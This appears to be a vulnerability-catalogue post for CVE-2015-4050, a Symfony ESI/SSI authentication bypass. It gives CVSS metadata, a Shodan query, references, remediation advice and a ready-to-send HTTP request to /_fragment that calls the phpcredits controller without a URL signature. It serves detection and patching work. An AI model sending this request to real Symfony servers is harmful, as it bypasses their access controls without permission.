---
layout: "post"
cve_id: "CVE-2015-4050"
title: "Symfony - Authentication Bypass"
pcap: true
pcap_path: "/pcaps/2015/CVE-2015-4050.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2015/CVE-2015-4050.yaml"
author: "ELSFA7110,meme-lord"
severity: "medium"
impact: "Successful exploitation of this vulnerability could allow an attacker to bypass authentication and gain unauthorized access to the affected system.
"
remediation: "Apply the latest security patches or upgrade to a non-vulnerable version of Symfony.
"
reference:
  - "https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access"
  - "http://symfony.com/blog/cve-2015-4050-esi-unauthorized-access"
  - "http://www.debian.org/security/2015/dsa-3276"
  - "https://nvd.nist.gov/vuln/detail/CVE-2015-4050"
  - "http://lists.fedoraproject.org/pipermail/package-announce/2015-June/159513.html"
classification: "{'cvss-metrics': 'CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N', 'cvss-score': 4.3, 'cve-id': 'CVE-2015-4050', 'cwe-id': 'CWE-284', 'epss-score': 0.76192, 'epss-percentile': 0.98882, 'cpe': 'cpe:2.3:a:sensiolabs:symfony:2.3.19:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'sensiolabs', 'product': 'symfony', 'shodan-query': 'cpe:"cpe:2.3:a:sensiolabs:symfony"'}"
tags:
  - "cve2015"
  - "cve"
  - "symfony"
  - "rce"
  - "sensiolabs"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Symfony 2.3.19 through 2.3.28, 2.4.9 through 2.4.10, 2.5.4 through 2.5.11, and 2.6.0 through 2.6.7, when ESI or SSI support enabled, does not check if the _controller attribute is set, which allows remote attackers to bypass URL signing and security rules by including (1) no hash or (2) an invalid hash in a request to /_fragment in the HttpKernel component.

## üåê HTTP Request
```nohighlight
GET /_fragment?_path=_controller=phpcredits&flag=-1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

